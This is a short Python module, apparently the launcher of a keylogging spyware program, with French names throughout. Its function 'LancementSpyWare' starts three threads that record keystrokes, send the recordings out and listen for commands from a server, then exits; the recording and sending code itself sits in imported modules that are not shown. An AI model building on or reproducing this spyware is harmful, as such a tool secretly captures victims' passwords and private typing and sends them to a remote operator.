import os
import threading

from .Clavier import *
from .Echange import *


def LancementSpyWare():
    
    Thread_Enregistreur = threading.Thread(target=EnregistreurClavier)
    Thread_Envoi = threading.Thread(target=EnvoiEnregistrementClavier)
    Thread_Ecoute = threading.Thread(target=EcouteSignalServeur)

    Thread_Enregistreur.start()
    Thread_Envoi.start()
    Thread_Ecoute.start()

    Thread_Enregistreur.join()
    Thread_Envoi.join()
    Thread_Ecoute.join()

    os._exit(0)
